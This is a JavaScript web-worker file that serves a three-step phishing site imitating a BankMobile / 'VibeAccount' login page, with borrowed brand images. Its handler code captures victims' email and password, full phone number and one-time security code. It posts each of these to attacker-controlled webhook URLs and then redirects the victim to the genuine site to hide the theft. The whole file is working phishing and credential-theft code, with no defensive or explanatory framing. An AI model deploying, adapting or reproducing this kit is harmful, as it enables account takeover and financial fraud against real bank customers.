const HTML_INDEX = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VibeAccount Login</title>
<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: url('https://www.vibeaccount.com/images/index_page_banner_school.jpg') no-repeat center center fixed;
    background-size: cover;
}
.header {
    width: 100%;
    background: #fff;
    border-bottom: 1px solid #e5e5e5;
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px 30px;
}
.header .logo img {
    height: 50px;
}
.header .login-container {
    display: flex;
    align-items: center;
    gap: 10px;
}
.header .login-container input[type="email"],
.header .login-container input[type="password"] {
    border: none;
    border-bottom: 2px solid #00a651;
    background: transparent;
    padding: 5px;
    font-size: 14px;
    outline: none;
    width: 180px;
}
.header .login-container button,
.header .login-container a.button {
    border: 1px solid #00a651;
    background: transparent;
    color: #00a651;
    padding: 6px 12px;
    cursor: pointer;
    font-weight: bold;
    text-decoration: none;
    border-radius: 3px;
}
.header .login-container button:hover,
.header .login-container a.button:hover {
    color: #007f3c;
    border-color: #007f3c;
}
.forgot-link {
    font-size: 12px;
    color: #00a651;
    text-decoration: none;
    display: block;
}
.forgot-link:hover {
    text-decoration: underline;
}
@media(max-width: 767px) {
    .header .login-container {
        width: 100%;
        margin-top: 10px;
        flex-direction: column;
        align-items: stretch;
    }
    .header .login-container input,
    .header .login-container button,
    .header .login-container a.button {
        width: 100%;
        margin: 5px 0;
    }
}
</style>
</head>
<body>
<div class="header">
    <div class="logo">
        <img src="https://www.refundselection.com/refundselection/images/ng-images/bankmobile-logo-black.svg" alt="BankMobile Logo">
    </div>
    <div class="login-container">
        <form id="loginStepHeader" method="POST" action="/api/login">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <a href="#" class="forgot-link">Forgot Login Information?</a>
            <button type="submit">LOG IN!</button>
            <a href="https://www.refundselection.com" class="button">Get Started</a>
            <input type="hidden" name="step" value="login">
        </form>
    </div>
</div>
</body>
</html>`;

const HTML_VERIFY = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Phone Verification</title>
<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: url('your-background.jpg') no-repeat center center fixed;
    background-size: cover;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}
.form-wrapper {
    background: #ffffff;
    padding: 35px;
    border-radius: 10px;
    box-shadow: 0 6px 20px rgba(0,0,0,0.15);
    min-width: 350px;
    text-align: center;
    border: 3px solid #00a651;
}
.verify-image {
    width: 200px;
    margin-bottom: 15px;
}
h2 {
    margin-bottom: 15px;
    font-size: 18px;
}
.phone-inputs {
    display: flex;
    justify-content: center;
    gap: 7px;
    margin-bottom: 15px;
}
.phone-inputs input {
    width: 60px;
    padding: 10px;
    font-size: 16px;
    text-align: center;
    border: 2px solid #00a651;
    border-radius: 5px;
    outline: none;
}
.phone-inputs input:focus {
    box-shadow: 0 0 5px rgba(0,166,81,0.4);
}
.sr-only {
    position: absolute;
    width: 1px;
    height: 1px;
    padding: 0;
    margin: -1px;
    overflow: hidden;
    clip: rect(0,0,0,0);
    border: 0;
}
.disclaimer {
    font-size: 12px;
    color: #666;
    margin-bottom: 20px;
}
.button-group {
    display: flex;
    justify-content: center;
    gap: 5px;
}
button {
    padding: 8px 18px;
    border-radius: 5px;
    font-weight: bold;
    cursor: pointer;
}
.back-btn {
    border: 1px solid #ccc;
    background: #f5f5f5;
    color: #333;
}
.back-btn:hover {
    background: #e5e5e5;
}
.submit-btn {
    border: 1px solid #00a651;
    background: #00a651;
    color: #ffffff;
}
.submit-btn:hover {
    background: #007f3c;
    border-color: #007f3c;
}
button:focus {
    outline: 2px dashed #00a651;
    outline-offset: 2px;
}
@media(max-width: 400px) {
    .phone-inputs input {
        width: 18%;
        min-width: 45px;
    }
}
</style>
</head>
<body>
<div class="form-wrapper">
    <img src="/lock.jpeg" alt="Phone Verification" class="verify-image">
    <h2>Enter Your Registered Phone Number To Continue</h2>
    <form method="POST" action="/api/verify">
        <div class="phone-inputs">
            <label>
                <span class="sr-only">Area code</span>
                <input type="tel" name="part1" maxlength="3" pattern="\d{3}" required>
            </label>
            <label>
                <span class="sr-only">Central office code</span>
                <input type="tel" name="part2" maxlength="3" pattern="\d{3}" required>
            </label>
            <label>
                <span class="sr-only">Line number</span>
                <input type="tel" name="part3" maxlength="4" pattern="\d{4}" required>
            </label>
        </div>
        <p class="disclaimer">
            Please be advised that we do not guarantee the delivery of alerts.<br>
            Receipt of alerts may be delayed or prevented by <br>factors affecting your mobile service provider.
        </p>
        <div class="button-group">
            <button type="button" class="back-btn" onclick="window.history.back()">Go Back</button>
            <button type="submit" class="submit-btn">Submit</button>
        </div>
        <input type="hidden" name="step" value="verify">
    </form>
</div>
<script>
const inputs = document.querySelectorAll('.phone-inputs input');
inputs.forEach((input, i) => {
    input.addEventListener('input', () => {
        if (input.value.length === input.maxLength && i < inputs.length - 1) {
            inputs[i + 1].focus();
        }
    });
});
</script>
</body>
</html>`;

const HTML_OTP = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OTP Verification</title>
<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: url('your-background.jpg') no-repeat center center fixed;
    background-size: cover;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}
.form-wrapper {
    background: #fff;
    padding: 30px;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    min-width: 320px;
    display: flex;
    flex-direction: column;
    gap: 15px;
}
h2 { text-align: center; font-size: 18px; margin-bottom: 10px; }
input {
    padding: 10px;
    font-size: 16px;
    border: 2px solid #00a651;
    border-radius: 4px;
    text-align: center;
}
button {
    padding: 10px;
    border: 1px solid #00a651;
    background: transparent;
    color: #00a651;
    font-weight: bold;
    cursor: pointer;
    border-radius: 4px;
}
.verify-image {
    width: 200px;
    margin-bottom: 15px;
}
button:hover {
    color: #007f3c;
    border-color: #007f3c;
}
.back-button {
    background: #f0f0f0;
    color: #101a54;
    border: 1px solid #ccc;
}
.back-button:hover {
    background: #e0e0e0;
}
</style>
</head>
<body>
<div class="form-wrapper">
    <h2>Enter the Secure Code Sent to Your Phone</h2>
    <form method="POST" action="/api/otp">
        <input type="text" name="otp" maxlength="6" placeholder="Enter OTP" required>
        <div style="display:flex; gap:10px; justify-content:center; margin-top:10px;">
            <button type="button" class="back-button" onclick="window.history.back()">Go Back</button>
            <button type="submit">Verify</button>
        </div>
    </form>
</div>
</body>
</html>`;

function getHtmlPage(pathname) {
  const normalized = pathname === '/' ? '/index.html' : pathname;
  const pages = {
    '/index.html': HTML_INDEX,
    '/verify.html': HTML_VERIFY,
    '/otp.html': HTML_OTP,
  };
  return pages[normalized] || null;
}

function getCookieValue(cookieHeader, name) {
  if (!cookieHeader) return '';
  const match = cookieHeader
    .split(';')
    .map((entry) => entry.trim())
    .find((entry) => entry.startsWith(`${name}=`));
  return match ? decodeURIComponent(match.split('=')[1]) : '';
}

function sendWebhook(webhookUrl, payload) {
  if (!webhookUrl || typeof webhookUrl !== 'string') return Promise.resolve(false);

  try {
    return fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    }).then((response) => response.ok).catch(() => false);
  } catch (error) {
    return Promise.resolve(false);
  }
}

async function handleFormRequest(request, env) {
  let formData;

  try {
    formData = await request.formData();
  } catch (error) {
    return new Response('Invalid form submission', { status: 400 });
  }

  const body = Object.fromEntries(formData.entries());

  if (request.url.includes('/api/login')) {
    const email = String(body.email || '').trim();
    const password = String(body.password || '');

    if (!email || !password || !email.includes('@')) {
      return Response.redirect('https://example.com', 302);
    }

    try {
      await sendWebhook(env.LOGIN_WEBHOOK_URL, {
        content: `Login Attempt: Email \`${email}\` | Password \`${password}\``
      });
    } catch (error) {
      // Ignore webhook failures so the page still works.
    }

    return Response.redirect('/verify.html', 302);
  }

  if (request.url.includes('/api/verify')) {
    const part1 = String(body.part1 || '').replace(/\D/g, '');
    const part2 = String(body.part2 || '').replace(/\D/g, '');
    const part3 = String(body.part3 || '').replace(/\D/g, '');

    if (part1.length !== 3 || part2.length !== 3 || part3.length !== 4) {
      return Response.redirect('/verify.html', 302);
    }

    const phoneNumber = `${part1}${part2}${part3}`;
    const last4 = phoneNumber.slice(-4);

    try {
      await sendWebhook(env.VERIFY_WEBHOOK_URL, {
        content: `Registered Phone Number: \`${phoneNumber}\``
      });
    } catch (error) {
      // Ignore webhook failures so the page still works.
    }

    const response = Response.redirect('/otp.html', 302);
    response.headers.append('Set-Cookie', `phone_last4=${encodeURIComponent(last4)}; Path=/; SameSite=Lax; Max-Age=3600`);
    return response;
  }

  if (request.url.includes('/api/otp')) {
    const otp = String(body.otp || '').replace(/\D/g, '');
    const cookieHeader = request.headers.get('Cookie') || '';
    const last4 = getCookieValue(cookieHeader, 'phone_last4') || 'XXXX';

    try {
      await sendWebhook(env.OTP_WEBHOOK_URL, {
        content: `OTP submitted: \`${otp}\` | Phone last 4 digits: \`${last4}\``
      });
    } catch (error) {
      // Ignore webhook failures so the page still works.
    }

    return Response.redirect('https://vibeaccount.com', 302);
  }

  return new Response('Not Found', { status: 404 });
}

export default {
  async fetch(request, env) {
    if (request.method === 'POST' && request.url.includes('/api/')) {
      return handleFormRequest(request, env);
    }

    const url = new URL(request.url);
    const page = getHtmlPage(url.pathname);

    if (page) {
      return new Response(page, {
        headers: { 'Content-Type': 'text/html; charset=utf-8' },
      });
    }

    if (url.pathname === '/lock.jpeg') {
      return fetch('https://www.refundselection.com/refundselection/images/ng-images/bankmobile-logo-black.svg');
    }

    return Response.redirect('/index.html', 302);
  },
};
